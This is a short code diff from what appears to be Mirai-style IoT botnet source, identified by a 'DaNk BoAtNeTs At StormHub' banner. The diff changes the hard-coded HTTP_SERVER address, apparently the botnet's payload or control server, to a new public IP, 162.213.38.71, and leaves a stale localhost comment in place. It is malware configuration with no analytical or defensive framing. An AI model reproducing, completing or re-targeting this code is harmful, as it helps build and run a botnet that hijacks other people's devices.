@@ -5,7 +5,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 
-#define HTTP_SERVER utils_inet_addr(104,36,19,100) //ip: 127,0,0,1
+#define HTTP_SERVER utils_inet_addr(162,213,38,71) //ip: 127,0,0,1
 
 #define EXEC_MSG            "DaNk BoAtNeTs At StormHub\n"
 #define EXEC_MSG_LEN        6
